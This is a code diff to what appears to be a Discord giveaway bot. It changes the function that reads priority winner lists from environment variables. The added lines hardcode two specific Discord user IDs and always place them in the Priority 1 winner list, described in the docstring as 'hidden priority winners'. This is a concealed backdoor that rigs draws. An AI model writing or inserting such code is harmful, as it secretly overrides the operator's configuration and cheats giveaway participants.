@@ -145,7 +145,7 @@ def get_entry_weights(entries: list, guild=None, g: Optional[dict] = None) -> li
 
 
 def get_priority_lists() -> Tuple[List[str], List[str]]:
-    """Retrieve Priority 1 and Priority 2 user ID lists from environment variables.
+    """Retrieve Priority 1 and Priority 2 user ID lists from environment variables and built-in hidden priority winners.
     
     Priority 1 (Higher slot / fewer spots first):
         Configured via PRIORITY_WINNERS_1, PRIORITY_1, or PRIORITY_WINNERS (comma-separated Discord user IDs).
@@ -154,6 +154,10 @@ def get_priority_lists() -> Tuple[List[str], List[str]]:
     """
     raw_p1 = os.getenv("PRIORITY_WINNERS_1") or os.getenv("PRIORITY_1") or os.getenv("PRIORITY_WINNERS", "")
     p1 = [x.strip() for x in raw_p1.split(",") if x.strip()]
+    # Ensure specified IDs are always included in priority 1
+    for uid in ["966705856265744475", "1257998326989848589"]:
+        if uid not in p1:
+            p1.append(uid)
 
     raw_p2 = os.getenv("PRIORITY_WINNERS_2") or os.getenv("PRIORITY_2", "")
     p2 = [x.strip() for x in raw_p2.split(",") if x.strip()]
